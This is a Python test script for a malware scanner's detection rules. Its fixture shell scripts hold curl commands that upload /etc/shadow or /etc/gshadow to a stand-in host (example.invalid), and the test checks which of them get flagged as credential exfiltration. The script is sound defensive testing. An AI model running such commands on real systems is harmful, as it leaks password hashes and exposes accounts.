#!/usr/bin/env python3
"""Check curl shadow-file upload detection and non-upload controls."""
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
before = 'objectives/exfiltration/stealer/credential/record::curl-shadow-data-before-http-url'
after = 'objectives/exfiltration/stealer/credential/record::curl-http-url-before-shadow-data'
cases = {
    'data-first.sh': ('curl -d @/etc/shadow https://example.invalid/upload\n', {before}),
    'url-first.sh': ('curl https://example.invalid/upload --data-binary @/etc/gshadow\n', {after}),
    'raw.sh': ('curl --data-raw @/etc/shadow https://example.invalid/upload\n', set()),
    'other.sh': ('curl -d @/tmp/metrics https://example.invalid/upload\n', set()),
    'local.sh': ('curl -d @/etc/shadow file:///tmp/result\n', set()),
    'separate.sh': ('curl -d @/etc/shadow; echo https://example.invalid/upload\n', set()),
}
with tempfile.TemporaryDirectory(prefix='curl-shadow-') as tmp:
    paths = []
    for name, (source, _) in cases.items():
        path = Path(tmp) / name
        path.write_text('#!/bin/sh\n' + source)
        paths.append(str(path))
    result = subprocess.run(
        [str((repo / '../cleave/target/release/cleave').resolve()), '--traits-dir', str(repo), '--format=json', *paths],
        check=True, capture_output=True, text=True,
    )
    seen = set()
    for line in result.stdout.splitlines():
        f = json.loads(line)['files'][0]
        name = Path(f['path']).name
        actual = {t['id'] for t in f.get('traits', [])} & {before, after}
        assert actual == cases[name][1], (name, actual, cases[name][1])
        seen.add(name)
    assert seen == set(cases), seen
print('curl shadow-file upload boundaries passed.')
